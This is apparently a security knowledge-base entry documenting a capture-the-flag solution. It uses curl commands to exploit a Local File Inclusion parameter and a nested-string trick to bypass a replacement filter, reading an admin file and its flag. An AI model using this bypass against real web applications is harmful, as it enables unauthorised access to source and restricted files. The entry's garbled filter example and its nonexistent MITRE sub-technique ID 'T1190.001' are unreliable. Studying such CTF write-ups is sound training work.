---
id: proc-uuid-6
tags:
  - lfi
  - filter-bypass
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-lfi-index-php]]'
  - '[[commands/curl-lfi-bypass-admin]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:55.526Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[T1190.001]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-LFI-Filters-to-Read-Arbitrary-PHP-Files

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in the /my-diary/?template= parameter by reading index.php source to understand filters, then bypassing string replacements to include secretadmin.php and extract the flag.

## Description

The template param allows PHP inclusion after filter replacements (e.g., admin -> adsecreta min). Crafted input like secretadsecretaadmin.phpdmin.phpmin.php evades to read admin files. Targets PHP apps with insufficient sanitization.

## Requirements

1. HTTP client like curl
2. Knowledge of filter patterns from source
3. Target LFI endpoint

## Defense

Defensive measures and detection strategies:

- Sanitize inputs with whitelists
- Disable allow_url_include in PHP
- Log file access attempts

## Objectives

1. Read application source
2. Access restricted files
3. Disclose admin flag

## Instructions

### Step 1: Read Index.php Source

**Context**: Confirm LFI by including main file.

**Command** ([[commands/curl-lfi-index-php]]):
```bash
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=index.php
```

> Displays PHP source, revealing filter logic.

### Step 2: Bypass to Admin File

**Context**: Craft param to evade replacements.

**Command** ([[commands/curl-lfi-bypass-admin]]):
```bash
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
```

> Outputs <h4>flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- [[T1190.001]] Exploit LFI

## Commands Used

- [[commands/curl-lfi-index-php]]
- [[commands/curl-lfi-bypass-admin]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[lfi]]
- [[filter-bypass]]
